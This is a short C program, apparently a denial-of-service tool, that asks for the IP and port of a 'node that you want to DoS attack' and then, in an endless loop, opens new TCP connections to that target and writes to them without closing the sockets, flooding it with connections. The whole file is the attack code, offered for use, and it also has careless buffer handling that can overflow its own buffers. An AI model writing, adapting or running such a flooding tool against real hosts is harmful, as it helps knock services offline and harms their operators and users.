#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <memory.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

#define MAX_MSG_SIZE 32

int main() {
    int sock_fd, syn;
    struct sockaddr_in node_addr;
	char *input = malloc(MAX_MSG_SIZE);
	char *ip = malloc(MAX_MSG_SIZE);
    char *port = malloc(MAX_MSG_SIZE);
	char *temp;

	printf("Write IP:PORT of node that you want to DoS attack :)\n");
	scanf("%s", input);

    int i = 0, j = 0;
    while(input[i] != ':') {
        ip[j] = input[i];
        i++; j++;
    }
    i++; j = 0;
    while(input[i] != '\0') {
        port[j] = input[i];
        i++; j++;
    }

    memset(&node_addr, 0, sizeof(node_addr));
    node_addr.sin_family = AF_INET;
    node_addr.sin_port = htons(strtol(port, &temp, 10));
    inet_pton(AF_INET, ip, &node_addr.sin_addr);

    while(1) {
      	sock_fd = socket(AF_INET, SOCK_STREAM, 0);
      	
          if (connect(sock_fd, (struct sockaddr *)&node_addr, sizeof(node_addr)) == -1) {
        	printf("[ERROR] Couldn't connect to %s:%s\n", ip, port);
    	}

        syn = htonl(1);
    	write(sock_fd, &syn, sizeof(int));
    }

	return 0;
}